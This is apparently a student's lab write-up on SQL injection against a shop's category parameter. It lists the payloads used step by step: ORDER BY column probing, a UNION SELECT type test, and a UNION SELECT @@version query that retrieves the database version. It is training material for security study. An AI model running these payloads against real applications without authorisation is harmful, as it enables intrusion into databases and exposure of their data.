Lab 08

The end goal is to display the DB Version

Analysis:
Vulnerable field is the category field (accessories)

(1). Find number of columns 
' order by 1--

I got an error doing this so the next step was to use the # as a comment to test.

After doing this I was successful:
' order by 1#
'order by 2#
'order by 3# -> server error
I then did 

(2) Determine the type of data 
I entered in 
'UNION SELECT 'a', 'b'# successfully and received 'a' and 'b' as feedback.

Lastly, I attempted to retrieve the DB version with the following:
' UNION SELECT @@version, NULL#

This successfuly retrieved the db version
